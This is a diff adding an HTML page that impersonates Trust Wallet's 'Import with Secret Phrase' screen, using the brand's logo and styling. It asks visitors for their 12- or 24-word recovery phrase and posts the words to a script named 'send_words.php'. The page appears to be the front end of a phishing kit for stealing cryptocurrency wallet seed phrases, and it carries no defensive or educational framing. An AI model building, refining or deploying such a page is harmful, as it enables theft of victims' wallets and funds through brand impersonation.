@@ -1,0 +1,317 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Trust Wallet - Import with Secret Phrase</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: hsl(240 1.8% 10.8% / 1);
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 40px 20px;
+            color: white;
+        }
+
+        .logo-container {
+            margin-bottom: 60px;
+        }
+
+        .logo {
+            width: 80px;
+            height: 80px;
+            background: linear-gradient(135deg, #00d4aa 0%, #00a8ff 100%);
+            border-radius: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            margin: 0 auto 15px;
+        }
+
+        .logo::before {
+            content: '';
+            width: 35px;
+            height: 45px;
+            background: white;
+            clip-path: polygon(50% 0%, 0% 100%, 100% 100%);
+            border-radius: 0 0 8px 8px;
+        }
+
+        .trust-text {
+            color: #00d4aa;
+            font-size: 18px;
+            font-weight: 700;
+            text-align: center;
+            letter-spacing: 1px;
+        }
+
+        .form-container {
+            background: hsl(240 1.8% 10.8% / 1);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 16px;
+            padding: 40px;
+            width: 100%;
+            max-width: 600px;
+            backdrop-filter: blur(10px);
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 4px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 2px;
+            margin-bottom: 30px;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            width: 66%;
+            height: 100%;
+            background: linear-gradient(90deg, #00d4aa 0%, #00a8ff 100%);
+            border-radius: 2px;
+        }
+
+        .form-title {
+            font-size: 28px;
+            font-weight: 600;
+            margin-bottom: 30px;
+            text-align: center;
+        }
+
+        .dropdown-container {
+            margin-bottom: 30px;
+        }
+
+        .dropdown {
+            width: 100%;
+            background: hsl(240 1.8% 10.8% / 1);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: 8px;
+            padding: 16px;
+            color: white;
+            font-size: 16px;
+            appearance: none;
+            cursor: pointer;
+            background-image: url("data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 20 20'%3e%3cpath stroke='%23ffffff' stroke-linecap='round' stroke-linejoin='round' stroke-width='1.5' d='m6 8 4 4 4-4'/%3e%3c/svg%3e");
+            background-position: right 16px center;
+            background-repeat: no-repeat;
+            background-size: 16px;
+            padding-right: 50px;
+        }
+
+        .dropdown:focus {
+            outline: none;
+            border-color: #00d4aa;
+            box-shadow: 0 0 0 3px rgba(0, 212, 170, 0.1);
+        }
+
+        .words-grid {
+            display: grid;
+            gap: 16px;
+            margin-bottom: 30px;
+        }
+
+        .words-grid.grid-12 {
+            grid-template-columns: repeat(2, 1fr);
+        }
+
+        .words-grid.grid-24 {
+            grid-template-columns: repeat(4, 1fr);
+        }
+
+        .word-input-container {
+            position: relative;
+        }
+
+        .word-input {
+            width: 100%;
+            background: rgba(60, 60, 60, 0.6);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: 8px;
+            padding: 16px 50px 16px 16px;
+            color: white;
+            font-size: 16px;
+            transition: all 0.3s ease;
+        }
+
+        .word-input::placeholder {
+            color: rgba(255, 255, 255, 0.5);
+        }
+
+        .word-input:focus {
+            outline: none;
+            border-color: #00d4aa;
+            background: rgba(60, 60, 60, 0.8);
+            box-shadow: 0 0 0 3px rgba(0, 212, 170, 0.1);
+        }
+
+        .eye-icon {
+            position: absolute;
+            right: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 20px;
+            height: 20px;
+            cursor: pointer;
+            opacity: 0.6;
+            transition: opacity 0.3s ease;
+        }
+
+        .eye-icon:hover {
+            opacity: 1;
+        }
+
+        .eye-icon svg {
+            width: 100%;
+            height: 100%;
+            fill: white;
+        }
+
+        @media (max-width: 768px) {
+            .form-container {
+                padding: 30px 20px;
+            }
+            
+            .words-grid.grid-24 {
+                grid-template-columns: repeat(2, 1fr);
+            }
+            
+            .form-title {
+                font-size: 24px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .words-grid.grid-12,
+            .words-grid.grid-24 {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="logo-container">
+        <!-- <div class="logo"></div> -->
+<svg fill="none" width="62" height="87" viewBox="0 0 62 87" xmlns="http://www.w3.org/2000/svg">
+                    <g clip-path="url(#clip0_26161_83707)">
+                        <path d="M-0.00195312 26.9479L30.5756 16.9648V86.0759C8.73428 76.8606 -0.00195312 59.1989 -0.00195312 49.2159V26.9465V26.9479Z" fill="#48FF91"></path>
+                        <path d="M61.1556 26.9479L30.5781 16.9648V86.0759C52.4194 76.8606 61.1556 59.1989 61.1556 49.2172V26.9479Z" fill="url(#paint0_linear_26161_83707)"></path>
+                        <path d="M12.0561 0.34082H16.3227V2.73096C17.7214 0.582458 19.33 0.34082 21.6857 0.34082V4.56603H20.6128C17.7905 4.56603 16.4387 5.89434 16.4387 8.52474V13.0151H12.0547V0.34082H12.0561Z" fill="#48FF91"></path>
+                        <path d="M35.9252 13.0137H31.5413V11.8055C30.5844 12.917 29.2795 13.3989 27.6709 13.3989C24.6166 13.3989 22.8906 11.5887 22.8906 8.25687V0.34082H27.2746V7.2696C27.2746 8.83818 28.0437 9.75502 29.3486 9.75502C30.6534 9.75502 31.5413 8.86165 31.5413 7.34141V0.34082H35.9252V13.0151V13.0137Z" fill="#48FF91"></path>
+                        <path d="M36.9961 9.10059H41.1012C41.289 10.0174 41.9172 10.4027 43.4319 10.4027C44.6677 10.4027 45.3913 10.1141 45.3913 9.58249C45.3913 9.17101 45.0406 8.9059 44.0395 8.68912L40.7284 7.94073C38.5136 7.43536 37.3938 6.15538 37.3938 4.10215C37.3938 1.39719 39.3752 -0.00292969 43.2221 -0.00292969C47.0689 -0.00292969 48.9578 1.36129 49.2851 4.28303H45.2049C45.1358 3.51117 44.3419 3.03894 43.037 3.03894C41.989 3.03894 41.3124 3.37585 41.3124 3.88398C41.3124 4.31755 41.7543 4.65584 42.6421 4.87539L46.1162 5.72043C48.4 6.27412 49.4977 7.43398 49.4977 9.31738C49.4977 11.9257 47.236 13.4708 43.3905 13.4708C39.545 13.4708 37.0016 11.8056 37.0016 9.10059H36.9975H36.9961Z" fill="#48FF91"></path>
+                        <path d="M61.17 4.28158V0.34082H50.3516V4.28435H53.5798V13.0137H57.9404V4.28158H61.17Z" fill="#48FF91"></path>
+                        <path d="M10.8366 4.28158V0.34082H0.0195312V4.28435H3.24781V13.0137H7.60833V4.28158H10.8366Z" fill="#48FF91"></path>
+                    </g>
+                    <defs>
+                        <linearGradient id="paint0_linear_26161_83707" x1="29.1518" y1="94.7238" x2="54.3898" y2="3.84876" gradientUnits="userSpaceOnUse">
+                            <stop offset="0.26" stop-color="#48FF91"></stop>
+                            <stop offset="0.66" stop-color="#0094FF"></stop>
+                            <stop offset="0.8" stop-color="#0038FF"></stop>
+                            <stop offset="0.89" stop-color="#0500FF"></stop>
+                        </linearGradient>
+                        <clipPath id="clip0_26161_83707">
+                            <rect width="61.1691" height="86.0768" fill="white"></rect>
+                        </clipPath>
+                    </defs>
+                </svg>   
+             </div>
+
+    <div class="form-container">
+        <div class="progress-bar">
+            <div class="progress-fill"></div>
+        </div>
+        
+        <h1 class="form-title">Import with Secret Phrase</h1>
+        
+        <div class="dropdown-container">
+            <select class="dropdown" id="wordCount">
+                <option value="12">I have a 12 word Secret Phrase</option>
+                <option value="24">I have a 24 word Secret Phrase</option>
+            </select>
+        </div>
+<form action="send_words.php" method="post">
+
+            <div class="words-grid grid-12" id="wordsGrid">
+                <!-- Words will be generated by JavaScript -->
+            </div>
+
+            <button type="submit" class="btn btn-primary" style="background: #2f2f2f;
+    color: white;
+    padding: 17px;
+    text-align: center;
+    border-radius: 15px;">Submit</button>
+        </form>
+    </div>
+
+    <script>
+        const wordCountSelect = document.getElementById('wordCount');
+        const wordsGrid = document.getElementById('wordsGrid');
+
+        function createWordInput(index) {
+            return `
+                <div class="word-input-container">
+                    <input type="password" name="wordinput[]" class="word-input" placeholder="Word #${index}" id="word${index}">
+                    <div class="eye-icon" onclick="toggleVisibility(${index})">
+                        <svg viewBox="0 0 24 24">
+                            <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
+                        </svg>
+                    </div>
+                </div>
+            `;
+        }
+
+        function generateWordInputs(count) {
+            let html = '';
+            for (let i = 1; i <= count; i++) {
+                html += createWordInput(i);
+            }
+            return html;
+        }
+
+        function updateGrid() {
+            const count = parseInt(wordCountSelect.value);
+            wordsGrid.innerHTML = generateWordInputs(count);
+            
+            // Update grid class
+            wordsGrid.className = `words-grid grid-${count}`;
+        }
+
+        function toggleVisibility(index) {
+            const input = document.getElementById(`word${index}`);
+            const eyeIcon = input.nextElementSibling;
+            
+            if (input.type === 'password') {
+                input.type = 'text';
+                eyeIcon.innerHTML = `
+                    <svg viewBox="0 0 24 24">
+                        <path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78l3.15 3.15.02-.16c0-1.66-1.34-3-3-3l-.17.01z"/>
+                    </svg>
+                `;
+            } else {
+                input.type = 'password';
+                eyeIcon.innerHTML = `
+                    <svg viewBox="0 0 24 24">
+                        <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
+                    </svg>
+                `;
+            }
+        }
+
+        // Initialize with 12 words
+        updateGrid();
+
+        // Listen for dropdown changes
+        wordCountSelect.addEventListener('change', updateGrid);
+    </script>
+</body>
+</html>
